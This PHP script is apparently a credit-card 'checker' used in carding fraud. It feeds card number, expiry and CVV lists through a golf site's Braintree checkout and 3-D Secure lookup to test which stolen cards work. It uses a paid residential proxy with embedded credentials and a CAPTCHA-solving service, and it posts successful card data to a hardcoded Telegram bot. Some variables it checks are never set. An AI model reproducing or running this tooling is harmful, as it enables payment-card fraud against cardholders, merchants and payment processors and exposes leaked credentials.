<?php
    error_reporting(0);
    $time_start = microtime(true);
    set_time_limit(200);
    // include("firstDataMessage.php");
    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }


    function RandomString($length = 16)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
    
   function cURLc($url, $headers, $postfields, $customrequest) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            // CURLOPT_SSL_VERIFYPEER => 1, 
            // CURLOPT_SSL_VERIFYHOST => 1, 
            // CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
    function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_SSL_VERIFYPEER => 0, 
            // CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
   
     function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_PROXY => "http://scraperapi.session_number=$port.ultra_premium=true.country_code=uk:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
            CURLOPT_PROXY => "isp2.hydraproxy.com:9989", 
            CURLOPT_PROXYUSERPWD => "rodm26298vzpo63485:SILNes0gboZ7gsle",
            CURLOPT_HEADER => 1,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $amnt = 1;
    $cc = $separator[0];
    $ccbin = substr($cc, 0,6);
    $mm = $separator[1];
    $yy = $separator[2];
    $yy1 = substr($yy, 2,2);
    $cvv = $separator[3];
    $cookie = RandomString();
    $cbin = substr($cc, 0,1);
    $rnum = rand(1111,9999);
    $str = substr(randomString(), 0,7);
    $m = ltrim($mm, 0);
    if($cbin == 5){ 
    $cbin = 'masterCard'; 
    } 
    else if($cbin == 4){ 
    $cbin = 'visa'; 
    }
$cc1 = substr($separator[0],0,4);
$cc2 = substr($separator[0],4,4);
$cc3 = substr($separator[0],8,4);
$cc4 = substr($separator[0],12,4);
function solveCaptcha($site,$siteKey,$clientKey){
$createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
               "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websitUSDL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
 $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
 $status = "processing";
 $gResponse = "";
  while ($status == "processing") {
    sleep(3);
    $getTaskResult =  cURLc(
        "https://api.capmonster.cloud/getTaskResult ",
        $headers = [
                "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
        "POST"
    );
 $status = getstr($getTaskResult,'"status":"','"');
 $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
return $getTaskResult ;
}
     // $port = rand(10000, 11000);
 function get_bankinfo($ccbins){
    $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://binov.net/",
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_HEADER => 1,
            CURLOPT_HTTPHEADER => [
            "Content-Type: application/x-www-form-urlencoded",
            "Referer: https://binov.net/",
           'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32'
            ],
            CURLOPT_POSTFIELDS => "BIN=$ccbins"
        ));
        $g_ccdets = curl_exec($ch);
        $cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
        $cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
        $cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
        $cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
        $cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
        // return array($cc_type0 => $cc_type0, $cc_bname => $cc_bname, $cc_type1 => $cc_type1, $cc_type2 => $cc_type2, $cc_country => $cc_country);
         $CC_fDets = "Bank: $cc_bname Country: $cc_country";
         return  $CC_fDets;
}
$ips = "175.176.92.54";
$retries = 1;
$transaction_complete = false;
//while ($retries < 2 && $transaction_complete == false) {
 	# code...
	$page =  cURL(
        "https://meandmygolf.com/coaching-plans/",
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'referer: https://meandmygolf.com/coaching-plans/',
          'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53'
        ],
        "coaching_plan_product_id=331743",
        "POST",
        1,
        $cookie
    );
//       $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

    $checkout =  cURL(
        "https://meandmygolf.com/checkout/",
        $headers = [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "referer: https://meandmygolf.com/coaching-plans/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
        ],
        "",
        "GET",
        1,
        $cookie
    ); $data = json_decode(base64_decode(GetStr($checkout, 'wc_braintree_client_token = ["', '"')), true);
       $fprint = $data['authorizationFingerprint'];

$graphql = cURL(
    "https://payments.braintree-api.com/graphql",
    $headers = [
        "Accept: */*",
        "Authorization: Bearer $fprint",
        "Braintree-Version: 2018-05-10",
        "Content-Type: application/json",
        "Origin: https://assets.braintreegateway.com",
        "Referer: https://assets.braintreegateway.com/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
    ],
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"90012","streetAddress":"Central Ave"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    "POST",
    1,
    $cookie
);
$token = GetStr($graphql, '"token":"','"');
echo $lookup = cURL(
    "https://api.braintreegateway.com/merchants/jns594qhb6x8pc6t/client_api/v1/payment_methods/$token/three_d_secure/lookup",
    $headers = [
        'Accept: */*',
        'Accept-Language: en-US,en;q=0.9,mt;q=0.8',
        'Cache-Control: no-cache',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://www.meandmygolf.com',
        'Pragma: no-cache',
        'Referer: https://www.meandmygolf.com/checkout/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: cross-site',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47',
        'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"'
    ],
    '{"amount":"104.00","additionalInfo":{"billingLine1":"","billingLine2":"","billingCity":"","billingState":"","billingPostalCode":"","billingCountryCode":"US","billingPhoneNumber":"","billingGivenName":"'.$fname.'","billingSurname":"'.$lname.'","email":"'.$fname.rand(10,250).'@aol.com"},"bin":"'.$ccbin.'","dfReferenceId":"0_cbe5c606-9210-404d-b5d5-850202ad22da","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.85.2","cardinalDeviceDataCollectionTimeElapsed":626,"issuerDeviceDataCollectionTimeElapsed":'.rand(10012,11222).',"issuerDeviceDataCollectionResult":false},"authorizationFingerprint":"'.$fprint.'","braintreeLibraryVersion":"braintree/web/3.85.2","_meta":{"merchantAppId":"meandmygolf.com","platform":"web","sdkVersion":"3.85.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"9dd311c9-322a-41b2-ab37-30cf6d03878b"}}',
    "POST",
    1,
    $cookie
);
  if(strpos($ajax_confirm, 'Thank you for your payment.')) {
        echo '<tr><td><span class="badge bg-success">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
        file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' CHARGED CCN - STRPE GATE');

    }elseif(strlen($response) > 1) {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.urldecode($response).' - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }else {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Processing unsuccessful(May be Merchant is dead or network is blocked) - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }
//
//
//
//


?>  